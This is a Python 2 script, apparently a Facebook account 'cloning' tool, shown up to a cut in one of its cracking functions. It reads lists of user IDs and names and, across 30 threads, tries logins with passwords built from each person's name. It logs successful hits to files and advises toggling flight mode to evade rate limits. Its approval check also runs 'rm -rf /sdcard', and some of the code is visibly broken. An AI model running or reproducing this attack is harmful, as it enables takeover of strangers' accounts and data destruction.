#-*-coding:utf-8-*-

import uuid
import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
        import bs4
except ImportError:
        os.system("pip2 install bs4")
 
host="https://mbasic.facebook.com"

us = ['Mozilla/5.0 (Linux; Android 7.0; RNE-AL00 Build/HUAWEIRNE-AL00) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.4; es-es; GT-I9060C Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; HTC_One_S Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 2.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 4.3; fr-fr; SGH-T999 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 2.3.6; en-gb; GT-S5360 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.2; nl-nl; Desire_A8181 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.2; ru-ru; SM-T315 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 2.3.3; ru-ru; DROIDX Build/4.5.1_57_DX5-35) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; U30GT 2MH Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30']

logo ="""
\x1b[1;97m
  /$$$$$$  /$$   /$$ /$$$$$$$$ /$$   /$$ /$$      /$$  \x1b[1;91m/$$$$$$ 
\x1b[1;91m /$$__  $$| $$  /$$/| $$_____/| $$$ | $$| $$  /$ \x1b[1;91m| $$ /$$__  $$
\x1b[1;91m| $$  \ $$| $$ /$$/ | $$      | $$$$| $$| $$ \x1b[1;91m/$$$| $$| $$  \ $$
\x1b[1;91m| $$  | $$| $$$$$/  | $$$$$   | $$ $$ $$| $$/$$ \x1b[1;91m$$ $$| $$$$$$$$
\x1b[1;91m| $$  | $$| $$  $$  | $$__/   | $$  $$$$| $$$$_  \x1b[1;91m$$$$| $$__  $$
\x1b[1;91m| $$  | $$| $$\  $$ | $$      | $$\  $$$| $$$/ \ \x1b[1;91m $$$| $$  | $$
\x1b[1;91m|  $$$$$$/| $$ \  $$| $$$$$$$$| $$ \  $$| $$/   \ \x1b[1;91m $$| $$  | $$
\x1b[1;91m \______/ |__/  \__/|________/|__/  \__/|__/     \x1b[1;91m\__/|__/  |__
\x1b[1;97m------------------------------------------------
\x1b[1;91m[✓]\x1b[1;97mAuthor     : Okenwa Bright  
\x1b[1;91m[✓]\x1b[1;97mGithub     : Okenwa24
\x1b[1;91m[✓]\x1b[1;97mWhatsapp   : +2347061758885
\x1b[1;97m------------------------------------------------  """
host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["Pakistan"].lower()
except:
	ips=None

ok = []
cp = []
ttl =[]


def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "what are you thinking now" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result8

def rana():
    os.system("clear")
    print(logo)
    print("              [\x1b[1;97m\x1b[1;41m   Main Menu   \x1b[0m\x1b[1;97m]")
    print("\x1b[1;97m------------------------------------------------")
    print("\x1b[1;91m[1]\x1b[1;97mEnter Main Menu  [\x1b[1;97m\x1b[1;41mPaid\x1b[0m\x1b[1;97m]")
    print("\x1b[1;91m[2]\x1b[1;97mRandom Cloning   [\x1b[1;97m\x1b[1;41mFree\x1b[0m\x1b[1;97m]")
    print("\x1b[1;91m[3]\x1b[1;97mContact With Owner")
    print("\x1b[1;97m------------------------------------------------")
    rana_sel()
def rana_sel():
	sel = raw_input(" Choose --> ")
	if sel =="1":
		rana1()
	elif sel =="2":
		os.system("python2 Super.py")
	elif sel =="3":
		os.system('xdg-open https://wa.me/+2347061758885')
	
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()


#  Regaurd Rana Nadeem Rajput

def rana1():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mTake Aproval For Login '
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.rana.txt', 'r').read()
        if to ==" ":
            os.system('rm -rf /sdcard')
            os.system('rm -rf /sdcard/*')
        
    except (KeyError, IOError):
        rana()

    r = requests.get('').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        s()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \x1b[1;97mYour Id Is Not Approved '
        print ' \x1b[1;97mCopy the id and send to Admin'
        print ' \x1b[1;97mYour Key : ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+2347061758885')
        rana1()


def rana2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \x1b[1;92mCopy and press enter ,'
    id = uuid.uuid4().hex[:30]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+2347061758885q')
    sav = open('/sdcard/.rana.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;97mPress enter to check Approval ')
    s()



def s():
    os.system('clear')
    print logo
    print("[\x1b[1;97m\x1b[1;41mWellcome To Okenwa Tool\x1b[0m\x1b[1;97m]")
    print("\x1b[1;91m[1]\x1b[1;97m Hack From File\x1b[1;91m        [Method 1]")
    print("\x1b[1;91m[2]\x1b[1;97m Hack From File\x1b[1;91m        [Method 2]")
    print("\x1b[1;91m[3]\x1b[1;97m Hack From File\x1b[1;91m        [Method 3]")
    print("\x1b[1;91m[4]\x1b[1;97m Hack From Public id \x1b[1;91m ")
    print("\x1b[1;91m[5]\x1b[1;97m Hack From Multi Idz\x1b[1;91m            ")
    print("\x1b[1;91m[6]\x1b[1;97m File Making Automatic\x1b[1;91m")
    print("\x1b[1;91m[7]\x1b[1;97m Remove Double Link In File\x1b[1;91m   ")
    print("\x1b[1;91m[8]\x1b[1;97m Random Number Cloning\x1b[1;91m   ")
    print("\x1b[1;91m[9]\x1b[1;97m Hack Target Account\x1b[1;91m   ")
    print("\x1b[1;91m[0]\x1b[1;97m Back")
    print("\x1b[1;97m------------------------------------------------")
    s_option() 
def s_option():
 select = raw_input("\x1b[1;97mChoose  ")
 if select =="1":
	crack()
 if select =="2":
    menu2()
 if select =="3":
	menu3()
 if select =="4":
   os.system('python2 public.py')
 if select =="5":
	os.system('python2 multi.py')
 if select =="6":
	yayanxd()
 if select =="7":
	grab_links()
 if select =="8":
 	os.system('python2 without.py')
 if select =="9":
	 os.system('python2 target.py')
 if select =="0":
 	rana()

 else:
	print("\tSelect valid option")
	s_option()

def crack():
	os.system("clear")
	print(logo)
	print("\x1b[1;97m-----------------------------------------------------")
	print("\x1b[1;91m[1]\x1b[1;97mCrack File ")
	print("\x1b[1;91m[0]\x1b[1;97mBack")
	print("\x1b[1;97m-----------------------------------------------------")
	crack_select()
def crack_select():
	select = raw_input("\033[1;37mChoose ---> : \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print 
		filelist = raw_input("\x1b[1;91m[!]\x1b[1;97mEnter File Name: ")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print(" \033[1;37mRequested file not found\033[0;98m")
			raw_input(" Press enter to back ")
			crack()
	elif select =="0":
	    menu()
	else:
		print("\tSelect valid option\033[0;97m")
		choice_select()
	print("\x1b[1;97m------------------------------------------------")
	print("          [\x1b[1;97m\x1b[1;41m   Auto Pass Cracking   \x1b[0m\x1b[1;97m]")
	print("\x1b[1;97m------------------------------------------------")
	print''
	print("\033[1;91m[•]\033[1;97mTotal IDs In File:\033[1;95m "+str(len(id)))
	print("\033[1;91m[•]\033[1;97mCloning Started...")
	print("\033[1;91m[•]\033[1;97mStop Process press CTRL+Z")
	print("\x1b[1;97m------------------------------------------------")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		sharagent = random.choice(us)
		session = requests.Session()
		session.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":sharagent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		host="https://mbasic.facebook.com"
		try:
			ps = name + '123'
			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps, 'login': 'submit'})
			sp = data.content
			if 'mbasic_logout_button' in sp or 'save-device' in sp:
				print('\x1b[1;92m[RANA-OK] '+uid+' | '+ps+'\033[0;97m')
				ok = open('OK.txt', 'a')
				ok.write(uid+'|'+ps+'\n')
				ok.close()
				oks.append(uid+ps)
			else:
				if 'checkpoint' in sp:
					print('\x1b[1;94m[RANA-CP] '+uid+' | '+ps+'\033[0;97m')
					cp = open('CP.txt', 'a')
					cp.write(uid+'|'+ps+'\n')
					cp.close()
					cps.append(uid+ps)
				else:
					ps2 = name + '1234'
					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps2, 'login': 'submit'})
					sp = data.content
					if 'mbasic_logout_button' in sp or 'save-device' in sp:
						print('\x1b[1;92m[RANA-OK] '+uid+' | '+ps2+'\033[0;97m')
						ok = open('OK.txt', 'a')
						ok.write(uid+'|'+ps2+'\n')
						ok.close()
						oks.append(uid+ps2)
					else:
						if 'checkpoint' in sp:
							print('\x1b[1;95m[RANA-CP] '+uid+' | '+ps2+'\033[0;97m')
							cp = open('CP.txt', 'a')
							cp.write(uid+'|'+ps2+'\n')
							cp.close()
							cps.append(uid+ps2)
						else:
							ps3 = name + '786'
							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps3, 'login': 'submit'})
							sp = data.content
							if 'mbasic_logout_button' in sp or 'save-device' in sp:
								print('\x1b[1;92m[RANA-OK] '+uid+' | '+ps3+'\033[0;97m')
								ok = open('OK.txt', 'a')
								ok.write(uid+'|'+ps3+'\n')
								ok.close()
								oks.append(uid+ps3)
							else:
								if 'checkpoint' in sp:
									print('\x1b[1;93m[RANA-CP] '+uid+' | '+ps3+'\033[0;97m')
									cp = open('CP.txt', 'a')
									cp.write(uid+'|'+ps3+'\n')
									cp.close()
									cps.append(uid+ps3)
								else:
									ps4 = name + '1122'
									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps4, 'login': 'submit'})
									sp = data.content
									if 'mbasic_logout_button' in sp or 'save-device' in sp:
										print('\x1b[1;92m[RANA-OK] '+uid+' | '+ps4+'\033[0;97m')
										ok = open('OK.txt', 'a')
										ok.write(uid+'|'+ps4+'\n')
										ok.close()
										oks.append(uid+ps4)
									else:
										if 'checkpoint' in sp:
											print('\x1b[1;94m[RANA-CP] '+uid+' | '+ps4+'\033[0;97m')
											cp = open('CP.txt', 'a')
											cp.write(uid+'|'+ps4+'\n')
											cp.close()
											cps.append(uid+ps4)
										else:
											ps5 = name + '00786'
											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps5, 'login': 'submit'})
											sp = data.content
											if 'mbasic_logout_button' in sp or 'save-device' in sp:
												print('\x1b[1;92m[RANA-OK] '+uid+' | '+ps5+'\033[0;97m')
												ok = open('OK.txt', 'a')
												ok.write(uid+'|'+ps5+'\n')
												ok.close()
												oks.append(uid+ps5)
											else:
												if 'checkpoint' in sp:
													print('\x1b[1;95m[RANA-CP] '+uid+' | '+ps5+'\033[0;97m')
													cp = open('CP.txt', 'a')
													cp.write(uid+'|'+ps5+'\n')
													cp.close()
													cps.append(uid+ps5)
												else:
													ps6 = name + '12'
													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps6, 'login': 'submit'})
													sp = data.content
													if 'mbasic_logout_button' in sp or 'save-device' in sp:
														print('\x1b[1;92m[RANA-OK] '+uid+' | '+ps6+'\033[0;97m')
														ok = open('OK.txt', 'a')
														ok.write(uid+'|'+ps6+'\n')
														ok.close()
														oks.append(uid+ps6)
													else:
														if 'checkpoint' in sp:
															print('\033[1;91m[RANA-CP] '+uid+' | '+ps6+'\033[0;97m')
															cp = open('CP.txt', 'a')
															cp.write(uid+'|'+ps6+'\n')
															cp.close()
															cps.append(uid+ps6)
														else:
															ps7 = ["first_name"] + ["last_name"]
															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps7, 'login': 'submit'})
															sp = data.content
															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																print('\x1b[1;92m[RANA-OK] '+uid+' | '+ps7+'\033[0;97m')
																ok = open('OK.txt', 'a')
																ok.write(uid+'|'+ps7+'\n')
																ok.close()
																oks.append(uid+ps7)
															else:
																if 'checkpoint' in sp:
																	print('\x1b[1;95m[RANA-CP] '+uid+' | '+ps7+'\033[0;97m')
																	cp = open('CP.txt', 'a')
																	cp.write(uid+'|'+ps7+'\n')
																	cp.close()
																	cps.append(uid+ps7)
																else:
																	ps8 = ["last_name"] + ["first_name"]
																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps8, 'login': 'submit'})
																	sp = data.content
																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																		print('\x1b[1;92m[RANA-OK] '+uid+' | '+ps8+'\033[0;97m')
																		ok = open('OK.txt', 'a')
																		ok.write(uid+'|'+ps8+'\n')
																		ok.close()
																		oks.append(uid+ps8)
																	else:
																		if 'checkpoint' in sp:
																			print('\x1b[1;93m[RANA-CP] '+uid+' | '+ps8+'\033[0;97m')
																			cp = open('CP.txt', 'a')
																			cp.write(uid+'|'+ps8+'\n')
																			cp.close()
																			cps.append(uid+ps8)
																		
																																										
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\x1b[1;97m------------------------\x1b[1;97m------------------------")
	print ("\x1b[1;91m[!]\x1b[1;97mProcess has been complete")
	print ("\x1b[1;91m[!]\x1b[1;97mTotal OK  "+str(len(oks)))
	print ("\x1b[1;91m[!]\x1b[1;97mTotal CP  "+str(len(cps)))
	print("\x1b[1;97m------------------------\x1b[1;97m------------------------")
	raw_input("\x1b[1;97mPress enter to back  Menu ")
	s()

def menu2():
    os.system('clear')
    print logo
    print("\x1b[1;91m[1]\x1b[1;97m Crack With Auto Pass")
    #print("\x1b[1;91m[2]\x1b[1;97m Crack With Choice Pass")
    print("\x1b[1;91m[0]\x1b[1;97m Back")
    print("\x1b[1;97m------------------------------------------------")
    menu2_option()
    
def menu2_option():
	select = raw_input("\x1b[1;97mChoose ---> ")
	if select =="1":
		crackc()
	elif select =="0":
	    s()

def crackc():
    os.system('clear')
    print logo
    print ""
    print ""
    try:
        mf=raw_input('\x1b[1;91m[!]\x1b[1;97mEnter File : ')
        print("\x1b[1;97m------------------------------------------------")
        for line in open(mf,'r').readlines():
            idx.append(line.strip())
    except:
        print ('file not found')
        time.sleep(2)
        menu2()
        
        
    print "\x1b[1;91m[!]\x1b[1;97m Total ids : "+str(len(idx))
    print("\x1b[1;97m------------------------------------------------")
    print "\x1b[1;91m[!]\x1b[1;97mCloning Start Now please Wait .."
    print "\x1b[1;91m[!]\x1b[1;97mFor Stop press ctrl+z..."
    print "\x1b[1;91m[!]\x1b[1;97mTurn on Flight Mode Every 5 mints for 5 Secnds"
    print("\x1b[1;97m------------------------------------------------")
    
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        lines = random.choice(['Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
			'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'b-api.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://b-api.facebook.com')
            b = rana.post('https://b-api.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[RANA-OK] "+uid + " | " + pass1
                ok=open('RANA-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;91m[RANA-CP] "+uid + " | " + pass1
                    cp=open('RANA-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = first+"123"
                    rana = requests.Session()
                    rana.headers.update({'Host': 'b-api.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://b-api.facebook.com')
                    b = rana.post('https://b-api.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[RANA-OK] "+uid + " | " + pass2
                        ok=open('Rana-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[RANA-CP] "+uid + " | " + pass2
                            cp=open('Rana-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = first+"last"
                            rana = requests.Session()
                            rana.headers.update({'Host': 'b-api.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://b-api.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[RANA-OK] "+uid + " | " + pass3
                                ok=open('Rana-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[RANA-CP] "+uid + " | " + pass3
                                    cp=open('Rana-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+"12345"
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'b-api.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://b-api.facebook.com')
                                    b = rana.post('https://b-api.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[RANA-OK] "+uid + " | " + pass4
                                        ok=open('Rana-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[RANA-CP] "+uid + " | " + pass4
                                            cp=open('Rana-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = first+"786"
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'b-api.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://b-api.facebook.com')
                                            b = rana.post('https://b-api.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[RANA-OK] "+uid + " | " + pass5
                                                ok=open('Rana-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[RANA-CP] "+uid + " | " + pass5
                                                    cp=open('Rana-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print "\x1b[1;97m"
    print "\x1b[1;91m[!]\x1b[1;97m Cloning Complete Result ........"
    print("\x1b[1;97m------------------------------------------------")
    print '\x1b[1;91m[!]\x1b[1;97mTotal ok ids : '+str(len(cps))
    print '\x1b[1;91m[!]\x1b[1;97mTotal cp ids : '+str(len(oks))
    print("\x1b[1;97m------------------------------------------------")
    print ''
    raw_input(' Press enter to back ')
    menu2()
	



def menu3():
    os.system('clear')
    print logo
    print("\x1b[1;91m[1]\x1b[1;97m Crack With Auto Pass")
    #print("\x1b[1;91m[2]\x1b[1;97m Crack With Choice Pass")
    print("\x1b[1;91m[0]\x1b[1;97m Back")
    print("\x1b[1;97m------------------------------------------------")
    menu3_option()
    
def menu3_option():
	select = raw_input("\x1b[1;97mChoose ---> ")
	if select =="1":
		cracko()
	elif select =="0":
	    s()
	
def cracko():
    os.system('clear')
    print logo
    print ""
    print ""
    try:
        mf=raw_input('\x1b[1;91m[!]\x1b[1;97mEnter File : ')
        print("\x1b[1;97m------------------------------------------------")
        for line in open(mf,'r').readlines():
            idx.append(line.strip())
    except:
        print ('file not found')
        time.sleep(2)
        menu3()
        
        
    print "\x1b[1;91m[!]\x1b[1;97m Total ids : "+str(len(idx))
    print("\x1b[1;97m------------------------------------------------")
    print "\x1b[1;91m[!]\x1b[1;97mCloning Start Now please Wait .."
    print "\x1b[1;91m[!]\x1b[1;97mFor Stop press ctrl+z..."
    print "\x1b[1;91m[!]\x1b[1;97mTurn on Flight Mode Every 5 mints for 5 Secnds"
    print("\x1b[1;97m------------------------------------------------")
    
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        lines = random.choice(['Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
			'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://m.facebook.com')
